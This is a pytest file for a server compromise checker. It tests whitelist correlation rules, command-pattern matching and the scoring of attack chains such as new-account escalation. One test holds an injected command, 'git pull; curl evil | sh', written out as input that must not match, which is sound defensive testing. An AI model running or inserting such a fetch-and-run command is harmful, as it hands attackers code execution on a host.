"""Correlation (PR 2.3): whitelist conditions on partner events, and attack
chains that earn a bonus in the score."""

import math
import time

import pytest
from test_snapshot import add_bundle, host_records

from checker.assess import analyze
from checker.correlate import (
    CHAINS,
    command_matches,
    correlated,
    find_chains,
    parse_duration,
)
from checker.events import Event
from checker.scoring import logit, score
from checker.whitelist import Correlation, Layer, WhitelistError, read_layer

T = "2026-11-01T10:00:{:02d}+00:00"


WRITER = {"sudo.command": "sudo", "ssh.login.accepted": "sshd"}


def ev(kind, second, own=False, journal=True, **fields):
    """An event as the journal records it from the real program (root),
    unless journal=False (a log file only) or a journal_comm is given."""
    at = T.format(second) if second < 60 else f"2026-11-0{1 + second // 86400}T10:00:00+00:00"
    if journal:
        fields = {"journal_comm": WRITER.get(kind, "x"), "journal_uid": "0"} | fields
    return Event(at, at, "system_journal", kind, fields, own_session=own)


def login(user="deploy", second=0, address="203.0.113.9"):
    return ev("ssh.login.accepted", second, user=user, address=address)


def sudo(command, user="deploy", second=5, own=False, **extra):
    return ev("sudo.command", second, own=own, user=user, command=command, runas="deploy", **extra)


def condition(**fields):
    return Correlation.model_validate({"event": "sudo.command", "within": "30s"} | fields)


def finding_for(*indices, check="ssh.login", **extra):
    return {
        "check": check,
        "variant": "new_address",
        "category": "compromise indicator",
        "band": "medium",
        "title": "t",
        "summary": "s",
        "entities": ["address:203.0.113.9", "account:deploy"],
        "evidence": [{"event": i} for i in indices],
        **extra,
    }


# --- the pieces ----------------------------------------------------------------------------


def test_durations():
    assert parse_duration("30s").total_seconds() == 30
    assert parse_duration("2h").total_seconds() == 7200
    for bad in ("30", "0s", "-5m", "1w", "1.5h", ""):
        with pytest.raises(ValueError):
            parse_duration(bad)


def test_command_patterns_are_whole_and_never_backtrack():
    assert command_matches("/usr/bin/git -C /var/www/* pull", "/usr/bin/git -C /var/www/app pull")
    assert not command_matches("/usr/bin/git pull", "/usr/bin/git pull; curl evil | sh")
    assert command_matches("*git pull", "sudo -u deploy git pull")
    start = time.monotonic()
    assert not command_matches("*a*a*a*a*a*a*b", "a" * 2000)
    assert time.monotonic() - start < 1


# --- whitelist conditions ---------------------------------------------------------------------


def test_a_login_followed_by_the_deploy_command_is_correlated():
    events = [login(), sudo("/usr/bin/git pull")]
    assert correlated(condition(command="/usr/bin/git pull"), finding_for(0), events)


@pytest.mark.parametrize(
    ("events", "why"),
    [
        ([login(), sudo("/usr/bin/git pull", user="eve")], "another account"),
        ([login(), sudo("/usr/bin/git pull", second=45)], "too late"),
        ([login(second=5), sudo("/usr/bin/git pull", second=0)], "before, not after"),
        ([login(), sudo("/usr/bin/git pull", own=True)], "the tool's own"),
        ([login(), sudo("/bin/bash")], "another command"),
        ([login()], "no partner"),
    ],
)
def test_no_partner_no_correlation(events, why):
    assert not correlated(condition(command="/usr/bin/git pull"), finding_for(0), events), why


def test_every_cited_event_needs_its_partner():
    events = [login(), sudo("/usr/bin/git pull"), login(second=40)]
    assert not correlated(condition(command="/usr/bin/git pull"), finding_for(0, 2), events)
    events.append(sudo("/usr/bin/git pull", second=50))
    assert correlated(condition(command="/usr/bin/git pull"), finding_for(0, 2), events)


def test_direction_and_address():
    events = [sudo("/usr/bin/git pull", second=0), login(second=5)]
    assert correlated(
        condition(command="/usr/bin/git pull", direction="before"), finding_for(1), events
    )
    events = [login(), ev("ssh.login.accepted", 3, user="deploy", address="198.51.100.1")]
    same = Correlation.model_validate(
        {"event": "ssh.login.accepted", "within": "10s", "same": ["address"]}
    )
    assert not correlated(same, finding_for(0), events)  # another address; not itself
    events.append(ev("ssh.login.accepted", 4, user="deploy", address="203.0.113.9"))
    assert correlated(same, finding_for(0), events)


def test_no_events_or_no_cited_events_never_correlate():
    assert not correlated(condition(), finding_for(0), None)
    assert not correlated(condition(), finding_for(), [login(), sudo("x")])


RULE = """
rules:
  - id: deploy-after-login
    match:
      check: ssh.login
      variant: new_address
      account: deploy
      correlated_with: {correlation}
    reason: "Deploys log in from anywhere, then pull."
    owner: john
    expires: never
"""


@pytest.mark.parametrize(
    ("correlation", "message"),
    [
        ("{event: git.pull, within: 30s, command: '*git pull'}", "no event type"),
        ("{event: sudo.command, within: 2d, command: '*git pull'}", "at most 1d"),
        ("{event: sudo.command, within: 30s, command: '**'}", "name the command"),
        ("{event: sudo.command, within: 30s, same: [], command: '*git pull'}", "same"),
        ("{event: sudo.command, within: 30s, command: '*git pull'}", "full path"),
        ("{event: sudo.command, within: 1d, direction: either, command: '/*'}", "full path"),
        ("{event: sudo.command, within: 30s, same: [address], command: '/x'}", "no address"),
        ("{event: ssh.login.accepted, within: 30s, command: '/usr/bin/x'}", "carry a command"),
    ],
)
def test_invalid_conditions_are_refused(tmp_path, correlation, message):
    path = tmp_path / "w.yaml"
    path.write_text(RULE.format(correlation=correlation))
    with pytest.raises(WhitelistError, match=message):
        read_layer(path)


def test_a_rule_with_a_condition_suppresses_only_when_it_holds(tmp_path):
    path = tmp_path / "w.yaml"
    path.write_text(
        RULE.format(correlation="{event: sudo.command, within: 30s, command: '/usr/bin/git pull'}")
    )
    from checker.whitelist import build

    merged = build([("host h", str(path), read_layer(path))])
    events = [login(), sudo("/usr/bin/git pull"), login("deploy", 40)]
    pulled, alone = finding_for(0), finding_for(2)
    merged.apply([pulled, alone], events=events)
    assert pulled["suppressed_by"]["rule"] == "deploy-after-login"
    assert "suppressed_by" not in alone
    merged.apply([pulled], events=None)  # no events: nothing to correlate with
    assert "suppressed_by" not in pulled


# --- chains ------------------------------------------------------------------------------


VARIANT = {
    "account.log_changes": "created",
    "ssh.authorized_keys": "new_key",
    "account.changes": "new",
}


def f(check, account, first_seen=None, new=False, **extra):
    return {
        "check": check,
        "variant": VARIANT.get(check),
        "category": "compromise indicator",
        "band": "high",
        "title": check,
        "summary": account,
        "entities": [f"account:{account}"],
        "first_seen": first_seen,
        "new": new,
        **extra,
    }


DAY0 = "2026-11-01T10:00:00+00:00"


LATER = DAY0.replace("10:00", "11:00")


def escalation(login_at=LATER, **sudo_extra):
    findings = [
        f("account.log_changes", "eve", DAY0),
        f("sudo.rules", "eve", new=True, **sudo_extra),
    ]
    events = [Event(login_at, login_at, "x", "ssh.login.accepted", {"user": "eve"})]
    return findings, events


PREVIOUS = "2026-10-31T10:00:00+00:00"


def test_new_account_given_privilege_then_used():
    findings, events = escalation()
    [chain] = find_chains(findings, events)
    assert chain["chain"] == "new-account-escalated-used" and chain["account"] == "eve"
    assert chain["findings"] == [0, 1] and chain["events"] == [0]


@pytest.mark.parametrize(
    ("change", "why"),
    [
        ({"login_at": "2026-11-01T09:00:00+00:00"}, "the login came before the account"),
        ({"login_at": "2026-11-09T10:00:00+00:00"}, "more than 7 days later"),
        ({"new": False}, "the privilege wasn't new since the previous bundle"),
        ({"suppressed_by": {"rule": "x"}}, "the privilege was explained"),
    ],
)
def test_broken_chains_earn_nothing(change, why):
    login_at = change.pop("login_at", LATER)
    findings, events = escalation(login_at)
    findings[1].update(change)
    assert find_chains(findings, events) == [], why


def test_a_guessed_login_then_a_new_key():
    findings = [
        f("ssh.guessed", "root", DAY0),
        f("ssh.authorized_keys", "root", new=True),
    ]
    [chain] = find_chains(findings, [], PREVIOUS)
    assert chain["chain"] == "guessed-then-entrenched"
    findings[1]["entities"] = ["account:other"]
    assert find_chains(findings, [], PREVIOUS) == []


def test_each_chain_counts_once_however_many_accounts_complete_it():
    findings = [
        f("ssh.guessed", "root", DAY0),
        f("ssh.authorized_keys", "root", new=True),
        f("ssh.guessed", "admin", DAY0),
        f("ssh.authorized_keys", "admin", new=True),
    ]
    chains = find_chains(findings, [], PREVIOUS)
    assert [c["account"] for c in chains] == ["admin"]


def test_a_chain_adds_its_bonus_to_the_score():
    findings, events = escalation()
    chains = find_chains(findings, events)
    alone = score([dict(x) for x in findings], 0.02)
    together = score([dict(x) for x in findings], 0.02, chains)
    assert together["log_odds"] - alone["log_odds"] == pytest.approx(math.log(5), abs=1e-3)
    [bonus] = [c for c in together["contributors"] if c["finding"] is None]
    assert bonus["check"] == "chain:new-account-escalated-used" and bonus["ratio"] == 5.0
    assert together["log_odds"] > logit(0.02)


def test_chains_are_data():
    assert {c.id for c in CHAINS} == {
        "new-account-escalated-used",
        "guessed-then-entrenched",
        "web-shell-used",
    }
    assert all(c.ratio > 1 for c in CHAINS)


def test_an_analysis_records_its_chains(home):
    _, store, identity, config = home
    add_bundle(home, "b1", 0, host_records())
    assessment = analyze(store, "web01", identity, config.recipients)
    assert assessment["score"]["chains"] == []


def test_sudo_rules_name_who_they_grant_to():
    from checker.checks.accounts import _sudo_who

    assert _sudo_who("eve ALL=(ALL) NOPASSWD: ALL") == ["account:eve"]
    assert _sudo_who("%wheel ALL=(ALL) ALL") == ["group:wheel"]
    assert _sudo_who("Defaults env_reset") == []
    assert _sudo_who("ADMINS ALL=(ALL) ALL") == []  # an alias names no one plainly
    assert _sudo_who("eve,bob ALL=(ALL) ALL") == ["account:eve", "account:bob"]
    assert _sudo_who("deploy , eve ALL=(ALL) NOPASSWD: ALL") == ["account:deploy", "account:eve"]
    for nobody_plainly in ("#1000 ALL=(ALL) ALL", "+admins ALL=(ALL) ALL", "eve,ADMINS ALL=ALL"):
        assert _sudo_who(nobody_plainly) == []


def test_layers_still_load_without_conditions():
    assert Layer.model_validate({}).rules == []


# --- from the review of 2.3 ----------------------------------------------------------------


@pytest.mark.parametrize(
    ("partner", "why"),
    [
        (sudo("/usr/bin/git pull", journal=False), "a log file line only"),
        (sudo("/usr/bin/git pull", journal_comm="logger"), "logger -t sudo"),
        (sudo("/usr/bin/git pull", journal_uid="1001"), "not root"),
    ],
)
def test_a_forged_or_unproven_partner_is_not_one(partner, why):
    assert not correlated(
        condition(command="/usr/bin/git pull"), finding_for(0), [login(), partner]
    ), why


def test_a_findings_own_events_dont_vouch_for_each_other():
    either = Correlation.model_validate(
        {"event": "ssh.login.accepted", "within": "1m", "direction": "either"}
    )
    events = [login(second=0), login(second=10)]
    assert not correlated(either, finding_for(0, 1), events)


def test_a_missing_user_is_never_the_same_user():
    events = [
        ev("ssh.login.accepted", 0, address="203.0.113.9"),
        sudo("/usr/bin/git pull", user=None),
    ]
    assert not correlated(condition(command="/usr/bin/git pull"), finding_for(0), events)


def test_too_many_candidate_partners_fail_closed(monkeypatch):
    import checker.correlate as c

    monkeypatch.setattr(c, "MAX_PARTNERS", 3)
    events = [login()] + [sudo("/usr/bin/git pull", second=1 + i) for i in range(5)]
    assert not correlated(condition(command="/usr/bin/git pull"), finding_for(0), events)


def test_an_overlong_command_never_matches():
    assert not command_matches("*", "x" * 3000)


def test_one_log_line_is_one_step_not_two():
    # One `usermod -aG sudo alice` is a log change and a privileged-group
    # change; with no new account or key, it is no chain.
    findings = [
        f(
            "account.log_changes",
            "alice",
            DAY0,
            variant="group_member_added",
            evidence=[{"event": 1}],
        ),
        f("group.privileged", "alice", new=True),
    ]
    events = [Event(LATER, LATER, "x", "ssh.login.accepted", {"user": "alice"})]
    assert find_chains(findings, events, PREVIOUS) == []


def test_untimed_steps_need_a_login_after_the_previous_bundle():
    findings = [
        f("ssh.authorized_keys", "eve", new=True),
        f("sudo.rules", "eve", new=True),
    ]
    month_ago = "2026-10-01T10:00:00+00:00"
    early = [Event(month_ago, month_ago, "x", "ssh.login.accepted", {"user": "eve"})]
    assert find_chains(findings, early, PREVIOUS) == []
    assert find_chains(findings, early, None) == []  # no previous bundle: no way to tell
    late = [Event(LATER, LATER, "x", "ssh.login.accepted", {"user": "eve"})]
    assert [c["chain"] for c in find_chains(findings, late, PREVIOUS)] == [
        "new-account-escalated-used"
    ]


def test_a_login_too_long_before_the_first_step_breaks_the_chain():
    findings, events = escalation()
    findings[0]["first_seen"] = "2026-10-20T10:00:00+00:00"  # 12 days before the login
    assert find_chains(findings, events) == []


def test_the_tools_own_account_never_completes_a_chain():
    findings, events = escalation()
    events.append(Event(LATER, LATER, "x", "ssh.login.accepted", {"user": "eve"}, own_session=True))
    assert find_chains(findings, events) == []


def test_an_own_session_login_is_not_a_step():
    findings, _ = escalation()
    own = [Event(LATER, LATER, "x", "ssh.login.accepted", {"user": "eve"}, own_session=True)]
    assert find_chains(findings, own) == []


def test_only_counted_findings_make_chains():
    for change in ({"category": "hygiene"}, {"band": "info"}):
        findings, events = escalation()
        findings[1].update(change)
        assert find_chains(findings, events) == []


def test_a_condition_must_name_the_account(tmp_path):
    path = tmp_path / "w.yaml"
    path.write_text(
        RULE.replace("      account: deploy\n", "").format(
            correlation="{event: sudo.command, within: 30s, command: '/usr/bin/git pull'}"
        )
    )
    with pytest.raises(WhitelistError, match="must name the account"):
        read_layer(path)
    path.write_text(path.read_text().replace("    reason:", "    broad: true\n    reason:"))
    with pytest.raises(WhitelistError, match="must name the account"):
        read_layer(path)


def test_a_step_long_before_the_first_breaks_the_chain():
    findings, events = escalation()
    findings[1]["first_seen"] = "2026-10-20T10:00:00+00:00"  # 12 days before step one
    findings[1]["new"] = False
    assert find_chains(findings, events) == []


def test_two_findings_citing_one_log_line_are_one_step():
    findings, events = escalation()
    findings[0]["evidence"] = [{"event": 7}]
    findings[1]["evidence"] = [{"event": 7}]
    assert find_chains(findings, events) == []


def test_untimed_steps_and_no_previous_bundle_make_no_chain():
    findings = [
        f("ssh.authorized_keys", "eve", new=True),
        f("sudo.rules", "eve", new=True),
    ]
    recent = [Event(LATER, LATER, "x", "ssh.login.accepted", {"user": "eve"})]
    assert find_chains(findings, recent, None) == []
